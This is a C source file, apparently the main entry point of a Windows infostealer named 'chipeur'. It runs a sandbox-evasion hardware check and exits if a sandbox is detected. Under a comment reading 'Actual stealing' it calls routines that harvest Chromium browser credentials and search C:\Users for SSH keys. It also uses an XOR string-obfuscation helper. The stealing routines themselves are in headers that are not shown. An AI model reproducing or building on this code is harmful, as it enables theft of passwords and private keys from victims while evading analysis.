#include "chipeur.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

#include "hardware_requirements.h"
#include "chromium.h"
#include "find_ssh_key.h"
#include "obfuscation.h"

void hello(void) { printf("Hello World\n"); }

int main(void) {
  // Puts the console in UTF-8
  // Allows us to print non-ASCII characters for debug
  SetConsoleOutputCP(CP_UTF8);

  // Stop if sandbox detected
  if (check_hardware() == EXIT_FAILURE){
    fprintf(stderr, "Hardware requirements check Failed: ");
    return EXIT_FAILURE;
  }

  // Actual stealing
  hello();
  steal_chromium_creds();
  find_ssh_key(L"C:\\Users");

  char str[] = "BOFFE";
  xor_str(str, strlen(str));
  printf("%s", str);

  return EXIT_SUCCESS;
}
